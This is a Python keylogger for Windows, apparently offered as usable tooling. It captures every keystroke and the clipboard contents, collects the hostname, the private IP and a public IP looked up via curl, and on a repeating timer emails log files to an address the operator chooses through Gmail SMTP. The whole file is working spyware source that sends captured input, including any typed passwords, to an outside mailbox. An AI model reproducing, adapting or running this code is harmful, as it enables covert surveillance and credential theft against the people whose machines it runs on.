from keyboard import on_release, wait, is_pressed # for keylogs
from smtplib import SMTP_SSL
from ssl import create_default_context
# Socket and platform module to gather computer information
from socket import gethostname, gethostbyname
from platform import system, machine, processor
# In order to regularly copy the clipboard, we'll need the following module
from win32clipboard import OpenClipboard, GetClipboardData, CloseClipboard
# Sending emails
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from os import popen # To get public ip
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = int(input("Send a report every many much seconds? "))
EMAIL_SENDER = input("Enter a gmail adress ")
PASSWORD = input("Enter its password ")
EMAIL_RECEIVER = input("Enter any email adress ")

hostname = gethostname()
IPAddr = gethostbyname(hostname)
processor = processor()
system = system()
machine = machine()

try:
    public_ip = popen('curl -s ifconfig.me').readline()
except Exception:
    public_ip = 'Couldn\'t get public ip'


class Keylogger:
    def __init__(self, interval):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""
        self.clipboard_data = ""
        # record start & end datetimes
        self.logdate = datetime.now().strftime("%b-%d-%Y-%H-%M-%S")

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # if special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name
    
    def copy_clipboard(self):
        with open("clipboard.txt", 'w') as f:
            try:
                OpenClipboard()
                self.clipboard_data = GetClipboardData()
                CloseClipboard
                f.write("Clipboard data:\n" + self.clipboard_data)
            except:
                f.write("This content could not be copied")
    
    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open("log.txt", "w") as f:
            # write the keylogs to the file
            f.write(self.log)

    def sendmail(self, sender_email, receiver_email, password, date):
        # sender_email, receiver_email, password and date for more information
        # inside the body (and the subject)
        subject = "Python report " + date
        body = '''
        Machine: {}
        Hostname: {}
        System: {}
        Processor: {}
        Private IP Adress: {}
        Public ip: {}
        Log date: {}
        '''.format(machine, hostname, system, processor, IPAddr, public_ip, date)
        try: #We'll be trying to send an email (it should not fail tho)
            # Create a multipart message and set headers
            message = MIMEMultipart()
            message["From"] = sender_email
            message["To"] = receiver_email
            message["Subject"] = subject

            # Add body to email
            message.attach(MIMEText(body, "plain"))

            files = ["log.txt", "clipboard.txt"]  # In same directory as script
            
            for filename in files:
                # we will both files ("log.txt" and "clipboard.txt")
                with open(filename, "rb") as attachment:
                    # Add file as application/octet-stream
                    part = MIMEBase("application", "octet-stream")
                    part.set_payload(attachment.read())

                # Encode file in ASCII characters to send by email    
                encoders.encode_base64(part)

                # Add header as key/value pair to attachment part
                part.add_header("Content-Disposition",
                                f"attachment; filename= {filename}")

                # Add attachment to message and convert message to string
                message.attach(part)
                text = message.as_string()

            # Log in to server using secure context and send email
            context = create_default_context()
            with SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
                server.login(sender_email, password)
                server.sendmail(sender_email, receiver_email, text)
                print('Email has been sent')
        except:
            print('Email could not be sent')

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log or self.clipboard_data:
            # if there is something in log or clipboard_data => report it
            self.report_to_file()
            self.copy_clipboard()
            self.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, PASSWORD, self.logdate)
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        # record the start datetime
        self.logdate = datetime.now().strftime("%b-%d-%Y-%H-%M-%S")
        # start the keylogger
        on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread, wait until CTRL+C is pressed
        wait()

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()

